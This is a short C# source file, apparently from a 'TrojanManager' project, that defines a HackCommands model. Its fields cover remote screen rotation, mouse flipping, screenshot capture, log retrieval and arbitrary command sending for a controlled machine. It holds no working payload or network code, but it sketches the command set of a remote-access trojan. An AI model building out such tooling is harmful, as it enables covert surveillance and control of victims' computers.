using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;

namespace TrojanManager.Models
{
    public class HackCommands
    {
        public HackCommands()
        {
            Orientations = new List<Orientation>();
            Orientations.Add(new Orientation((int)OrientatiosEnum.Zero, 0));
            Orientations.Add(new Orientation((int)OrientatiosEnum.Ninety, 90));
            Orientations.Add(new Orientation((int)OrientatiosEnum.OneHundredEighty, 180));
            Orientations.Add(new Orientation((int)OrientatiosEnum.TwoHundresSeventy, 270));
 
        }
        public HackCommands(Guid id) : this()
        {
            
            UserId = id;
        }

        public HackCommands(Guid id, string response) : this(id)
        {
            RemoteResponse = response;
        }

        public Guid UserId { get; set; }
        public int SelectedOrientation { get; set; }
        public List<Orientation> Orientations { get; set; }
        public bool FlipMouse { get; set; }
        public bool GetPrintScreen { get; set; }
        public bool GetLogs { get; set; }

        public string RemoteResponse { get; set; }
        public string Command { get; set; }
       
        public string OsMessage { get; set; }
    }

    public class Orientation
    {
        public Orientation()
        {

        }
        public Orientation(int id, int ord)
        {
            Id = id;
            OrientationDegrees = ord;
        }
        public int Id { get; set; }
        public int OrientationDegrees { get; set; }
    }

    public enum OrientatiosEnum
    {
        Zero,
        Ninety,
        OneHundredEighty,
        TwoHundresSeventy
    }
}
